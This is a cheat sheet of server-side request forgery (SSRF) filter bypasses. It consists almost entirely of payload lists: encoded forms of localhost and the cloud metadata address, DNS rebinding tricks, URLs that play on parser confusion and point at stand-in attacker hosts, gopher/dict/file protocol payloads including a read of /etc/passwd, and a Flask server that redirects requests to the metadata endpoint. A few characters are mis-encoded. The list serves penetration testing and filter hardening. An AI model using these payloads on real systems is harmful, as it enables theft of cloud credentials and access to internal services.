Filter Bypass Techniques
Common SSRF Filters and Bypasses
1. IP Address Restrictions

Filter: Blocks 127.0.0.1, 169.254.169.254

Bypasses:
python

# Decimal conversion
http://2130706433/  # 127.0.0.1
http://2852039166/  # 169.254.169.254

# Hexadecimal
http://0x7f000001/  # 127.0.0.1
http://0xa9fea9fe/  # 169.254.169.254

# Octal
http://0177.0.0.01/  # 127.0.0.1

# Mixed encoding
http://127.0.0.1.nip.io/  # DNS resolves to 127.0.0.1
http://169.254.169.254.nip.io/

# IPv6 variants
http://[::1]/  # localhost
http://[::ffff:7f00:0001]/  # IPv4-mapped IPv6
http://[0:0:0:0:0:ffff:7f00:0001]/

# URL encoding
http://127.0.0.1/%2e%2e/%2e%2e/google.com

2. Domain-Based Filters

Filter: Blocks localhost, metadata, internal

Bypasses:
bash

# DNS rebinding
http://1.0.0.127.rbndr.us/  # Resolves to 127.0.0.1 after first lookup

# Subdomain tricks
http://localhost@attacker.com/  # Some parsers ignore @
http://attacker.com#@127.0.0.1/

# Redirects
http://attacker.com/redirect-to-internal  # 302 to metadata

# Enclosed alphanumerics
http://‚ďĒ‚ďß‚ďź‚ďú‚ďü‚ďõ‚ďĒ.‚ďí‚ďě‚ďú/  # Unicode domains

3. Protocol Restrictions

Filter: Only allows http:// or https://

Bypasses:
bash

# Other protocols that make requests
file:///etc/passwd
gopher://internal-service:8080/_POST%20/path%20HTTP/1.0
dict://localhost:11211/  # Memcached
ftp://internal-service:21/
jar:http://example.com/file.jar!/

4. Path-Based Filters

Filter: Checks URL doesn't contain 169.254

Bypasses:
bash

# Redirect-based
http://169.254.169.254/ ‚Üí Redirect to metadata

# Different path
http://169.254.254.254/  # Wrong IP
http://metadata.google.internal/  # Different domain

# DNS wildcards
http://169.254.169.254.xip.io/





Advanced Bypass Techniques
Technique 1: HTTP Redirect Abuse
python

# Attacker-controlled redirect server
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redirect_to_metadata():
    return redirect('http://169.254.169.254/latest/meta-data/', code=302)

# If server follows redirects ‚Üí SSRF

Technique 2: URL Parsing Inconsistencies
python

# Different parsers interpret URLs differently
bypasses = [
    "http://127.0.0.1@evil.com/",  # Some parsers use evil.com, some 127.0.0.1
    "http://evil.com\\@127.0.0.1",  # Backslash confusion
    "http://127.0.0.1:80@evil.com:80/",  # Port confusion
    "http://evil.com#@127.0.0.1/",  # Fragment confusion
    "http://127.0.0.1:evil.com/",  # Colon confusion
]
